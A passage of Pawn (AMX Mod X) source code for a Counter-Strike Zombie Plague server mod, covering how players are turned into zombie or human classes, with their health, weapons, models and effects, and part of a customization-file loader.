	set_pev(id, pev_effects, pev(id, pev_effects) &~ EF_BRIGHTLIGHT)
	
	// Remove spawn protection (bugfix)
	g_nodamage[id] = false
	entity_set_int(id, EV_INT_effects, entity_get_int(id, EV_INT_effects) & ~EF_NODRAW)
	
	// Reset burning duration counter (bugfix)
	g_burning_duration[id] = 0
	
	// Show deathmsg and reward infector?
	if (rewards && infector)
	{
		// Send death notice and fix the "dead" attrib on scoreboard
		SendDeathMsg(infector, id)
		FixDeadAttrib(id)
		
		// Reward frags, deaths, health, and ammo packs
		UpdateFrags(infector, id, 1, 1, 1)
		UpdateAps(infector, gTH_Mult[infector][0]*3, 0, 1)
		set_user_health(infector, get_user_health(infector) + (100*gTH_Mult[infector][0]))
		
		gInfects[infector]++
		gInfectsRec[id]++
		gLogro_Infects[infector]++;
		
		if(gInfects[infector] >= 10000 && !g_logro[infector][LOGRO_ZOMBIE][INFECT_100000])
		{
			fnUpdateLogros(infector, LOGRO_ZOMBIE, INFECT_10000)
			
			if(gInfects[infector] >= 30000)
			{
				fnUpdateLogros(infector, LOGRO_ZOMBIE, INFECT_30000)
				
				if(gInfects[infector] >= 100000)
				{
					fnUpdateLogros(infector, LOGRO_ZOMBIE, INFECT_100000)
				}
			}
		}
		
		gDmgEcho[infector] += 100
		gDmgRec[id] += 100
	}
	
	// Cache speed and name for player's class
	g_zombie_spd[id] = ammount_upgradeF(id, HAB_ZOMBIE, ZOMBIE_SPEED, float(ArrayGetCell(g_zclass_spd, g_zombieclass[id])))
	ArrayGetString(g_zclass_name, g_zombieclass[id], g_zombie_classname[id], charsmax(g_zombie_classname[]))
	
	// Set zombie attributes based on the mode
	//static sound[64]
	if (!silentmode)
	{
		if (nemesis)
		{
			// Nemesis
			g_nemesis[id] = true
			formatex(gClass[id], charsmax(gClass[]), "Nemesis")
			
			// Set gravity, unless frozen
			if (!g_frozen[id]) set_user_gravity(id, ammount_upgradeF_special_mode(id, HAB_NEMESIS, NEMESIS_GRAVITY, 0.5))
			
			if( !gArmageddonRound && !gTaringaRound && !gSynapsisRound && !g_plagueround ) 
			{
				gHaveBazooka[id] = 1
				set_user_health(id, 15000 * fnGetAlive())
				
				CC(id, "!g[ZP]!y Recordá que tenes una bazooka, la puedes activar/desactivar con el !g+attack2!y (Clic Derecho)")
			}
			else if( gTaringaRound ) set_user_health(id, 12500 * fnGetAlive())
			else if( gSynapsisRound ) set_user_health(id, 12500 * fnGetAlive())
			else if( gArmageddonRound )
			{
				//set_user_health(id, ammount_upgrade(id, HAB_ZOMBIE, ZOMBIE_HP, floatround(float(ArrayGetCell(g_zclass_hp, g_zombieclass[id])) + (2500 * fnGetAlive()))))
				set_user_health(id, 8000 * fnGetAlive())
			}
			else set_user_health(id, 7000 * fnGetAlive())
			
			// Give LongJump
			give_item(id, "item_longjump")
			fm_set_user_longjump(id, true, true)
		}
		else if (troll)
		{
			// Troll
			gTroll[id] = true
			formatex(gClass[id], charsmax(gClass[]), "Troll")
			
			// Set gravity, unless frozen
			if (!g_frozen[id]) set_user_gravity(id, 1.0)
			
			set_user_health(id, 110 * fnGetAlive())
			
			CC(id, "!g[ZP]!y Recordá que tenes un poder, podes activarlo presionando !g+use + +attack2!y (E + Clic Derecho)")
			
			g_szCharLight[0] = 'o'

			// Lighting task
			set_task(0.01, "lighting_effects")
		}
		else if (fnGetZombies() == 1)
		{
			// First zombie
			g_firstzombie[id] = true
			formatex(gClass[id], charsmax(gClass[]), g_zombie_classname[id])
			
			// Set health and gravity, unless frozen
			new Float:fHP_Mult;
			if( gReset[id] < 1 && gLevel[id] < 100 ) fHP_Mult = 4.0
			else fHP_Mult = 2.0
			
			set_user_health(id, ammount_upgrade(id, HAB_ZOMBIE, ZOMBIE_HP, floatround(float(ArrayGetCell(g_zclass_hp, g_zombieclass[id])) * fHP_Mult)))
			if (!g_frozen[id]) set_user_gravity(id, ammount_upgradeF(id, HAB_ZOMBIE, ZOMBIE_GRAVITY, Float:ArrayGetCell(g_zclass_grav, g_zombieclass[id])))
			
			// Infection sound
			//ArrayGetString(zombie_infect, random_num(0, ArraySize(zombie_infect) - 1), sound, charsmax(sound))
			emit_sound(id, CHAN_VOICE, gSOUND_ZOMBIE_INFECT[random_num(0, sizeof gSOUND_ZOMBIE_INFECT -1)], 1.0, ATTN_NORM, 0, PITCH_NORM)
		}
		else
		{
			// Infected by someone
			formatex(gClass[id], charsmax(gClass[]), g_zombie_classname[id])
			
			// Set health and gravity, unless frozen
			set_user_health(id, ammount_upgrade(id, HAB_ZOMBIE, ZOMBIE_HP, ArrayGetCell(g_zclass_hp, g_zombieclass[id])))
			if (!g_frozen[id]) set_user_gravity(id, ammount_upgradeF(id, HAB_ZOMBIE, ZOMBIE_GRAVITY, Float:ArrayGetCell(g_zclass_grav, g_zombieclass[id])))
			
			// Infection sound
			//ArrayGetString(zombie_infect, random_num(0, ArraySize(zombie_infect) - 1), sound, charsmax(sound))
			emit_sound(id, CHAN_VOICE, gSOUND_ZOMBIE_INFECT[random_num(0, sizeof gSOUND_ZOMBIE_INFECT -1)], 1.0, ATTN_NORM, 0, PITCH_NORM)
			
			// Show Infection HUD notice
			/*set_hudmessage(255, 0, 0, HUD_INFECT_X, HUD_INFECT_Y, 0, 0.0, 5.0, 1.0, 1.0, -1)
			
			if (infector) // infected by someone?
				ShowSyncHudMsg(0, g_MsgSync, "%s ha perdido su cerebro a manos de %s...", g_playername[id], g_playername[infector])
			else
				ShowSyncHudMsg(0, g_MsgSync, "%s ha perdido su cerebro..", g_playername[id])*/
		}
	}
	else
	{
		// Silent mode, no HUD messages, no infection sounds
		formatex(gClass[id], charsmax(gClass[]), g_zombie_classname[id])
		
		// Set health and gravity, unless frozen
		set_user_health(id, ammount_upgrade(id, HAB_ZOMBIE, ZOMBIE_HP, ArrayGetCell(g_zclass_hp, g_zombieclass[id])))
		if (!g_frozen[id]) set_user_gravity(id, ammount_upgradeF(id, HAB_ZOMBIE, ZOMBIE_GRAVITY, Float:ArrayGetCell(g_zclass_grav, g_zombieclass[id])))
	}
	
	// Remove previous tasks
	remove_task(id+TASK_MODEL)
	remove_task(id+TASK_BLOOD)
	remove_task(id+TASK_AURA)
	remove_task(id+TASK_BURN)
	
	// Switch to T
	if (fm_cs_get_user_team(id) != FM_CS_TEAM_T) // need to change team?
	{
		remove_task(id+TASK_TEAM)
		fm_cs_set_user_team(id, FM_CS_TEAM_T)
		fm_user_team_update(id)
	}
	
	// Custom models stuff
	static currentmodel[32], tempmodel[32], already_has_model, i, iRand
	already_has_model = false
	
	// Get current model for comparing it with the current one
	fm_cs_get_user_model(id, currentmodel, charsmax(currentmodel))
	
	// Set the right model, after checking that we don't already have it
	if (g_nemesis[id])
	{
		if (equal(currentmodel, gMODEL_NEMESIS)) already_has_model = true
		if (!already_has_model) copy(g_playermodel[id], charsmax(g_playermodel[]), gMODEL_NEMESIS)
	}
	else if( gTroll[id] )
	{
		if (equal(currentmodel, gMODEL_TROLL)) already_has_model = true
		if (!already_has_model) copy(g_playermodel[id], charsmax(g_playermodel[]), gMODEL_TROLL)
	}
	else
	{
		for (i = ArrayGetCell(g_zclass_modelsstart, g_zombieclass[id]); i < ArrayGetCell(g_zclass_modelsend, g_zombieclass[id]); i++)
		{
			ArrayGetString(g_zclass_playermodel, i, tempmodel, charsmax(tempmodel))
			if (equal(currentmodel, tempmodel)) already_has_model = true
		}
		
		if (!already_has_model)
		{
			iRand = random_num(ArrayGetCell(g_zclass_modelsstart, g_zombieclass[id]), ArrayGetCell(g_zclass_modelsend, g_zombieclass[id]) - 1)
			ArrayGetString(g_zclass_playermodel, iRand, g_playermodel[id], charsmax(g_playermodel[]))
		}
	}
	
	// Need to change the model?
	if (!already_has_model)
	{
		// An additional delay is offset at round start
		// since SVC_BAD is more likely to be triggered there
		if (g_newround)
			set_task(5.0 * (gMODEL_CHANGE_DELAY + (gArmageddonRound) ? 1.0 : 0.01), "fm_user_model_update", id+TASK_MODEL)
		else
			fm_user_model_update(id+TASK_MODEL)
	}
	
	// Nemesis glow / remove glow, unless frozen
	if (!g_frozen[id])
	{
		if (g_nemesis[id]) set_user_rendering(id, kRenderFxGlowShell, 255, 0, 0, kRenderNormal, 25)
		else if( g_zombieclass[id] == 11 && g_zombie[id] && !gTroll[id] ) set_user_rendering(id, kRenderFxGlowShell, 0, 255, 0, kRenderNormal, 25) // Leader
		else set_user_rendering(id)
	}
	
	// Remove any zoom (bugfix)
	cs_set_user_zoom(id, CS_RESET_ZOOM, 1)
	
	// Remove armor
	set_user_armor(id, 0)
	
	// Drop weapons when infected
	/*drop_weapons(id, 1)
	drop_weapons(id, 2)*/
	
	// Strip zombies from guns and give them a knife
	strip_user_weapons(id)
	give_item(id, "weapon_knife")
	
	// Fancy effects
	infection_effects(id)
	
	// Nemesis aura task
	if (g_nemesis[id] && !gArmageddonRound && !gTaringaRound && !gSynapsisRound)
		set_task(0.1, "zombie_aura", id+TASK_AURA, _, _, "b")
	
	if( !gTroll[id] )
	{
		// Give Zombies Night Vision?
		g_nvision[id] = true
		g_nvisionenabled[id] = true
		
		// Custom nvg?
		remove_task(id+TASK_NVISION)
		set_task(0.1, "set_user_nvision", id+TASK_NVISION, _, _, "b")
	}
	
	if( g_firstzombie[id] )
	{
		// Give LongJump
		give_item(id, "item_longjump")
		fm_set_user_longjump(id, true, true)
		
		gLogro_ElZombieNoDie[id] = 1;
		
		g_nodamage[id] = true
		
		set_task(0.1, "zombie_aura", id+TASK_AURA, _, _, "b")
		set_task(7.0, "madness_over", id+TASK_BLOOD)
		
		//static sound[64]
		//ArrayGetString(zombie_madness, random_num(0, ArraySize(zombie_madness) - 1), sound, charsmax(sound))
		emit_sound(id, CHAN_VOICE, gSOUND_ZOMBIE_MADNESS, 1.0, ATTN_NORM, 0, PITCH_HIGH)
	}
	
	// Set custom FOV?
	message_begin(MSG_ONE, g_msgSetFOV, _, id)
	write_byte(110) // fov angle
	message_end()
	
	// Idle sounds task
	if (!g_nemesis[id] && !gTroll[id])
		set_task(random_float(50.0, 70.0), "zombie_play_idle", id+TASK_BLOOD, _, _, "b")
	
	// Turn off zombie's flashlight
	turn_off_flashlight(id)
	
	// Post user infect forward
	//ExecuteForward(g_fwUserInfected_post, g_fwDummyResult, id, infector, nemesis)
	
	// Last Zombie Check
	fnCheckLastZombie()
}

// Function Human Me (player id, turn into a survivor, silent mode)
humanme(id, survivor, silentmode, l4dplayer, wesker, jason, sniper) // HUMANME_F
{
	// User humanize attempt forward
	//ExecuteForward(g_fwUserHumanize_attempt, g_fwDummyResult, id, survivor)
	
	// One or more plugins blocked the "humanization". Only allow this after making sure it's
	// not going to leave us with no humans. Take into account a last player leaving case.
	// BUGFIX: only allow after a mode has started, to prevent blocking first survivor e.g.
	if (g_fwDummyResult >= ZP_PLUGIN_HANDLED && g_modestarted && fnGetHumans() > g_lastplayerleaving)
		return;
	
	// Pre user humanize forward
	//ExecuteForward(g_fwUserHumanized_pre, g_fwDummyResult, id, survivor)
	
	// Remove previous tasks
	remove_task(id+TASK_MODEL)
	remove_task(id+TASK_BLOOD)
	remove_task(id+TASK_AURA)
	remove_task(id+TASK_BURN)
	remove_task(id+TASK_NVISION)
	
	// Reset some vars
	g_zombie[id] = false
	g_nemesis[id] = false
	gTroll[id] = false
	g_survivor[id] = false
	g_firstzombie[id] = false
	g_canbuy[id] = true
	g_nvision[id] = false
	g_nvisionenabled[id] = false
	gPlayersL4D[id] = { false, false, false, false }
	gWesker[id] = false
	gJason[id] = false
	gSniper[id] = false
	
	// Remove survivor's aura (bugfix)
	set_pev(id, pev_effects, pev(id, pev_effects) &~ EF_BRIGHTLIGHT)
	
	// Remove spawn protection (bugfix)
	g_nodamage[id] = false
	entity_set_int(id, EV_INT_effects, entity_get_int(id, EV_INT_effects) &~ EF_NODRAW)
	
	// Reset burning duration counter (bugfix)
	g_burning_duration[id] = 0
	
	// Drop previous weapons
	drop_weapons(id, 1)
	drop_weapons(id, 2)
	RemoveAllWeaponsEdit(id, ARMA_PRIMARIA)
	RemoveAllWeaponsEdit(id, ARMA_SECUNDARIA)
	
	// Strip off from weapons
	strip_user_weapons(id)
	give_item(id, "weapon_knife")
	
	// Set human attributes based on the mode
	if (survivor)
	{
		// Survivor
		g_survivor[id] = true
		formatex(gClass[id], charsmax(gClass[]), "Survivor")
		
		// Set Health
		set_user_health(id, 100 * fnGetAlive())
		
		// Set gravity, unless frozen
		if (!g_frozen[id]) set_user_gravity(id, 1.0)
		
		if( gArmageddonRound )
		{
			if( gBubbleMaxInArmag < 5 )
			{
				give_item(id, "weapon_smokegrenade")
				gBubble[id] = 1
				
				CC(id, "!g[ZP]!y Te ha tocado una bubble especial contra Nemesis, usala en momentos adecuados")
				
				gBubbleMaxInArmag++
				
				// Give survivor his own weapon
				give_item(id, "weapon_m249")
				ExecuteHamB(Ham_GiveAmmo, id, MAXBPAMMO[cs_weapon_name_to_id("weapon_m249")], AMMOTYPE[cs_weapon_name_to_id("weapon_m249")], MAXBPAMMO[cs_weapon_name_to_id("weapon_m249")])
			}
			else
			{
				// Give survivor his own weapon
				give_item(id, "weapon_mp5navy")
				ExecuteHamB(Ham_GiveAmmo, id, MAXBPAMMO[cs_weapon_name_to_id("weapon_mp5navy")], AMMOTYPE[cs_weapon_name_to_id("weapon_mp5navy")], MAXBPAMMO[cs_weapon_name_to_id("weapon_mp5navy")])
			}
		}
		else
		{
			// Give survivor his own weapon
			give_item(id, "weapon_mp5navy")
			ExecuteHamB(Ham_GiveAmmo, id, MAXBPAMMO[cs_weapon_name_to_id("weapon_mp5navy")], AMMOTYPE[cs_weapon_name_to_id("weapon_mp5navy")], MAXBPAMMO[cs_weapon_name_to_id("weapon_mp5navy")])
		}
		
		if(g_hab[id][HAB_SURVIVOR][SURVIVOR_ARMA_MEJORADA])
		{
			drop_weapons(id, 1)
			gWeaponsEdit[id][ARMA_PRIMARIA] = 1
			
			if(g_hab[id][HAB_SURVIVOR][SURVIVOR_ARMA_MEJORADA] == 1)
			{
				gWeapon[id][ARMA_PRIMARIA][XM1014] = 1
				
				give_item(id, "weapon_xm1014")
				ExecuteHamB(Ham_GiveAmmo, id, MAXBPAMMO[cs_weapon_name_to_id("weapon_xm1014")], AMMOTYPE[cs_weapon_name_to_id("weapon_xm1014")], MAXBPAMMO[cs_weapon_name_to_id("weapon_xm1014")])
			}
			else
			{
				gWeapon[id][ARMA_PRIMARIA][COLT_2] = 1
				
				give_item(id, "weapon_m4a1")
				ExecuteHamB(Ham_GiveAmmo, id, MAXBPAMMO[cs_weapon_name_to_id("weapon_m4a1")], AMMOTYPE[cs_weapon_name_to_id("weapon_m4a1")], MAXBPAMMO[cs_weapon_name_to_id("weapon_m4a1")])
			}
		}
		
		if (!gArmageddonRound && !gTaringaRound && !gSynapsisRound) 
		{
			// Turn off his flashlight
			turn_off_flashlight(id)
			
			// Give the survivor a bright light
			set_pev(id, pev_effects, pev(id, pev_effects) | EF_BRIGHTLIGHT)
		
			if(!g_plagueround)
			{
				set_user_health(id, 250 * fnGetAlive())
			
				gPowerOn = 0
				gBubble[id] = 0
				give_item(id, "weapon_smokegrenade")
				
				CC(id, "!g[ZP]!y Recordá que tenes una bomba e inmunidad, podes activarla apretando !g+use + +attack2!y (E + Clic Derecho)")
			}
		}
	}
	else if( l4dplayer >= 1 )
	{
		// L4D player
		gPlayersL4D[id][l4dplayer-1] = true
		formatex(gClass[id], charsmax(gClass[]), "%s", gPlayersL4D[id][0] ? "BILL" : gPlayersL4D[id][1] ? "FRANCIS" : gPlayersL4D[id][2] ? "ZOEY" : "LUIS")
		
		// Set Health
		set_user_health(id, 250 * fnGetAlive())
		
		// Set gravity, unless frozen
		if (!g_frozen[id]) set_user_gravity(id, 1.0)
		
		// Give l4d player his own weapon
		static l4dplayer_weapon[32]
		format( l4dplayer_weapon, 31, "%s", ( gPlayersL4D[id][0] || gPlayersL4D[id][1] ) ? "weapon_mac10" : "weapon_m3" )
		
		give_item(id, l4dplayer_weapon)
		give_item(id, "weapon_elite")
		ExecuteHamB(Ham_GiveAmmo, id, MAXBPAMMO[cs_weapon_name_to_id(l4dplayer_weapon)], AMMOTYPE[cs_weapon_name_to_id(l4dplayer_weapon)], MAXBPAMMO[cs_weapon_name_to_id(l4dplayer_weapon)])
		ExecuteHamB(Ham_GiveAmmo, id, MAXBPAMMO[cs_weapon_name_to_id("weapon_elite")], AMMOTYPE[cs_weapon_name_to_id("weapon_elite")], MAXBPAMMO[cs_weapon_name_to_id("weapon_elite")])
		
		if (!gArmageddonRound && !gTaringaRound && !gSynapsisRound) 
		{
			// Turn off his flashlight
			turn_off_flashlight(id)
			
			// Give the survivor a bright light
			set_pev(id, pev_effects, pev(id, pev_effects) | EF_BRIGHTLIGHT)
		}
	}
	else if( wesker )
	{
		// Wesker
		gWesker[id] = true
		formatex(gClass[id], charsmax(gClass[]), "Wesker")
		
		// Set Health
		set_user_health(id, 175 * fnGetAlive())
		
		// Set gravity, unless frozen
		if (!g_frozen[id]) set_user_gravity(id, 0.75)
		
		if( !gTaringaRound )
		gShootAniq[id] = 3
		
		// Give wesker his own weapon
		give_item(id, "weapon_deagle")
		ExecuteHamB(Ham_GiveAmmo, id, MAXBPAMMO[cs_weapon_name_to_id("weapon_deagle")], AMMOTYPE[cs_weapon_name_to_id("weapon_deagle")], MAXBPAMMO[cs_weapon_name_to_id("weapon_deagle")])
		
		if (!gArmageddonRound && !gTaringaRound && !gSynapsisRound) 
		{
			// Turn off his flashlight
			turn_off_flashlight(id)
			
			// Give the survivor a bright light
			set_pev(id, pev_effects, pev(id, pev_effects) | EF_BRIGHTLIGHT)
		}
	}
	else if( jason )
	{
		// Ninja
		gJason[id] = true
		formatex(gClass[id], charsmax(gClass[]), "Jason")
		
		strip_user_weapons(id)
		give_item(id, "weapon_knife")
		replace_weapon_models(id, CSW_KNIFE)
		
		// Set Health
		set_user_health(id, 125 * fnGetAlive())
		
		// Set gravity, unless frozen
		if (!g_frozen[id]) set_user_gravity(id, 1.0)
		
		if (!gArmageddonRound && !gTaringaRound && !gSynapsisRound) 
		{
			// Turn off his flashlight
			turn_off_flashlight(id)
			
			// Give the survivor a bright light
			set_pev(id, pev_effects, pev(id, pev_effects) | EF_BRIGHTLIGHT)
		}
	}
	else if( sniper >= 1 )
	{
		// Sniper
		gSniper[id] = true
		
		if( sniper == 1 || sniper == 3 )
		{
			formatex(gClass[id], charsmax(gClass[]), "Sniper")
			
			// Set Health
			set_user_health(id, 175 * fnGetAlive())
			
			// Give sniper his own weapon
			give_item(id, "weapon_awp")
			ExecuteHamB(Ham_GiveAmmo, id, MAXBPAMMO[cs_weapon_name_to_id("weapon_awp")], AMMOTYPE[cs_weapon_name_to_id("weapon_awp")], MAXBPAMMO[cs_weapon_name_to_id("weapon_awp")])
		}
		else if( sniper == 2 || sniper == 4 )
		{
			formatex(gClass[id], charsmax(gClass[]), "Scouter")
			
			// Set Health
			set_user_health(id, 125 * fnGetAlive())
			
			// Give scout his own weapon
			give_item(id, "weapon_scout")
			ExecuteHamB(Ham_GiveAmmo, id, MAXBPAMMO[cs_weapon_name_to_id("weapon_scout")], AMMOTYPE[cs_weapon_name_to_id("weapon_scout")], MAXBPAMMO[cs_weapon_name_to_id("weapon_scout")])
		}
		
		// Set gravity, unless frozen
		if (!g_frozen[id]) set_user_gravity(id, 1.0)
		
		if (!gArmageddonRound && !gTaringaRound && !gSynapsisRound) 
		{
			// Turn off his flashlight
			turn_off_flashlight(id)
			
			// Give the survivor a bright light
			set_pev(id, pev_effects, pev(id, pev_effects) | EF_BRIGHTLIGHT)
		}
	}
	else
	{
		// Human taking an antidote
		formatex(gClass[id], charsmax(gClass[]), g_human_classname[id])
		
		// Show custom buy menu?
		set_task(0.2, "show_menu_buy1", id+TASK_SPAWN)
		
		// Set selected human class
		g_humanclass[id] = g_humanclassnext[id]
		
		// If no class selected yet, use the first (default) one
		if (g_humanclass[id] == HCLASS_NONE) g_humanclass[id] = 0
		
		// Cache speed, dmg, and name for player's class
		g_human_spd[id] = ammount_upgradeF(id, HAB_HUMAN, HUMAN_SPEED, float(ArrayGetCell(g_hclass_spd, g_humanclass[id])))
		ArrayGetString(g_hclass_name, g_humanclass[id], g_human_classname[id], charsmax(g_human_classname[]))
		
		// Set health, armor and gravity
		set_user_health(id, ammount_upgrade(id, HAB_HUMAN, HUMAN_HP, ArrayGetCell(g_hclass_hp, g_humanclass[id])))
		set_user_armor(id, ammount_upgrade(id, HAB_HUMAN, HUMAN_ARMOR, ArrayGetCell(g_hclass_armor, g_humanclass[id])))
		if(!g_frozen[id]) set_user_gravity(id, ammount_upgradeF(id, HAB_HUMAN, HUMAN_GRAVITY, Float:ArrayGetCell(g_hclass_grav, g_humanclass[id])))
		
		// Silent mode = no HUD messages, no antidote sound
		if (!silentmode)
		{
			// Antidote sound
			//static sound[64]
			//ArrayGetString(sound_antidote, random_num(0, ArraySize(sound_antidote) - 1), sound, charsmax(sound))
			emit_sound(id, CHAN_ITEM, gSOUND_ANTIDOTE, 1.0, ATTN_NORM, 0, PITCH_NORM)
			
			// Show Antidote HUD notice
			set_hudmessage(0, 0, 255, HUD_INFECT_X, HUD_INFECT_Y, 0, 0.0, 5.0, 1.0, 1.0, -1)
			ShowSyncHudMsg(0, g_MsgSync, "%s ha usado un antídoto...", g_playername[id])
		}
	}
	
	// Switch to CT
	if (fm_cs_get_user_team(id) != FM_CS_TEAM_CT) // need to change team?
	{
		remove_task(id+TASK_TEAM)
		fm_cs_set_user_team(id, FM_CS_TEAM_CT)
		fm_user_team_update(id)
	}
	
	// Custom models stuff
	static currentmodel[32], tempmodel[32], already_has_model, i, iRand
	already_has_model = false
	
	// Get current model for comparing it with the current one
	fm_cs_get_user_model(id, currentmodel, charsmax(currentmodel))
	
	// Set the right model, after checking that we don't already have it
	if (g_survivor[id])
	{
		if (equal(currentmodel, gMODEL_SURVIVOR)) already_has_model = true
		if (!already_has_model) copy(g_playermodel[id], charsmax(g_playermodel[]), gMODEL_SURVIVOR)
	}
	else if( gJason[id] )
	{
		if (equal(currentmodel, gMODEL_JASON)) already_has_model = true
		if (!already_has_model) copy(g_playermodel[id], charsmax(g_playermodel[]), gMODEL_JASON)
	}
	else if( gWesker[id] )
	{
		if (equal(currentmodel, gMODEL_WESKER)) already_has_model = true
		if (!already_has_model) copy(g_playermodel[id], charsmax(g_playermodel[]), gMODEL_WESKER)
	}
	else
	{
		for (i = ArrayGetCell(g_hclass_modelsstart, g_humanclass[id]); i < ArrayGetCell(g_hclass_modelsend, g_humanclass[id]); i++)
		{
			ArrayGetString(g_hclass_playermodel, i, tempmodel, charsmax(tempmodel))
			if (equal(currentmodel, tempmodel)) already_has_model = true
		}
		
		if (!already_has_model)
		{
			iRand = random_num(ArrayGetCell(g_hclass_modelsstart, g_humanclass[id]), ArrayGetCell(g_hclass_modelsend, g_humanclass[id]) - 1)
			ArrayGetString(g_hclass_playermodel, iRand, g_playermodel[id], charsmax(g_playermodel[]))
		}
	}
	
	// Need to change the model?
	if (!already_has_model)
	{
		// An additional delay is offset at round start
		// since SVC_BAD is more likely to be triggered there
		if (g_newround)
			set_task(5.0 * (gMODEL_CHANGE_DELAY + (gArmageddonRound) ? 1.0 : 0.01), "fm_user_model_update", id+TASK_MODEL)
		else
			fm_user_model_update(id+TASK_MODEL)
	}
	
	// Set survivor glow / remove glow, unless frozen
	if (!g_frozen[id])
	{
		if (g_survivor[id] || gPlayersL4D[id][0] || gPlayersL4D[id][1] || gPlayersL4D[id][2] || gPlayersL4D[id][3] || gWesker[id] || gJason[id] || gSniper[id])
			set_user_rendering(id, kRenderFxGlowShell, 0, 0, 255, kRenderNormal, 25)
		else set_user_rendering(id)
	}
	
	// Restore FOV?
	message_begin(MSG_ONE, g_msgSetFOV, _, id)
	write_byte(90) // angle
	message_end()
	
	// Post user humanize forward
	//ExecuteForward(g_fwUserHumanized_post, g_fwDummyResult, id, survivor)
	
	// Last Zombie Check
	fnCheckLastZombie()
}

/*================================================================================
 [Other Functions and Tasks]
=================================================================================*/

load_customization_from_files()
{
	// Build customization file path
	new path[64]
	get_configsdir(path, charsmax(path))
	format(path, charsmax(path), "%s/%s", path, ZP_CUSTOMIZATION_FILE)
	
	// File not present
	if (!file_exists(path))
	{
		new error[100]
		formatex(error, charsmax(error), "Cannot load customization file %s!", path)
		set_fail_state(error)
		return;
	}
	
	// Set up some vars to hold parsing info
	new linedata[1024], key[64], value[960], section
	
	// Open customization file for reading
	new file = fopen(path, "rt")
	
	while (file && !feof(file))
	{
		// Read one line at a time
		fgets(file, linedata, charsmax(linedata))
		
		// Replace newlines with a null character to prevent headaches
		replace(linedata, charsmax(linedata), "^n", "")
		
		// Blank line or comment
		if (!linedata[0] || linedata[0] == ';') continue;
		
		// New section starting
		if (linedata[0] == '[')
		{
			section++
			continue;
		}
		
		// Get key and value(s)
		strtok(linedata, key, charsmax(key), value, charsmax(value), '=')
		
		// Trim spaces
		trim(key)
		trim(value)
		
		switch (section)
		{
			/*case SECTION_SOUNDS:
			{
				if (equal(key, "WIN ZOMBIES"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(sound_win_zombies, key)
					}
				}
				else if (equal(key, "WIN HUMANS"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(sound_win_humans, key)
					}
				}
				elseif (equal(key, "WIN NO ONE"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(sound_win_no_one, key)
					}
				}
				else if (equal(key, "ZOMBIE INFECT"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(zombie_infect, key)
					}
				}
				else if (equal(key, "ZOMBIE PAIN"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(zombie_pain, key)
					}
				}
				else if (equal(key, "NEMESIS PAIN"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(nemesis_pain, key)
					}
				}
				else if (equal(key, "ZOMBIE DIE"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(zombie_die, key)
					}
				}
				else if (equal(key, "ZOMBIE MISS SLASH"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(zombie_miss_slash, key)
					}
				}
				else if (equal(key, "ZOMBIE MISS WALL"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(zombie_miss_wall, key)
					}
				}
				else if (equal(key, "ZOMBIE HIT NORMAL"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(zombie_hit_normal, key)
					}
				}
				else if (equal(key, "ZOMBIE HIT STAB"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(zombie_hit_stab, key)
					}
				}
				else if (equal(key, "ZOMBIE IDLE"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(zombie_idle, key)
					}
				}
				else if (equal(key, "ZOMBIE IDLE LAST"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(zombie_idle_last, key)
					}
				}
				else if (equal(key, "ZOMBIE MADNESS"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(zombie_madness, key)
					}
				}
				else if (equal(key, "ROUND NEMESIS"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(sound_nemesis, key)
					}
				}
				else if (equal(key, "ROUND SURVIVOR"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
						// Add to sounds array
						ArrayPushString(sound_survivor, key)
					}
				}
				else if (equal(key, "ROUND SWARM"))
				{
					// Parse sounds
					while (value[0] != 0 && strtok(value, key, charsmax(key), value, charsmax(value), ','))
					{
						// Trim spaces
						trim(key)
						trim(value)
						
